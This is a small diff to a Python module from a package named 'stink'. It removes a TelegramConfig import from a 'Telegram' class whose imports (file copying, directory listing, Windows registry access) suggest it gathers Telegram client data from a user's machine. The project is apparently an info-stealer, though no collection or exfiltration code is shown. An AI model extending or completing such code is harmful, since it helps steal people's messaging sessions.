@@ -3,8 +3,6 @@ from shutil import copyfile
 from os import listdir, path, makedirs
 from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER
 
-from stink.helpers.config import TelegramConfig
-
 
 class Telegram:
     """
@@ -13,7 +11,6 @@ class Telegram:
     def __init__(self, storage_path: str, folder: str):
 
         self.__full_path = path.join(storage_path, folder)
-        self.__config = TelegramConfig()
 
     def __create_folder(self) -> None:
         """
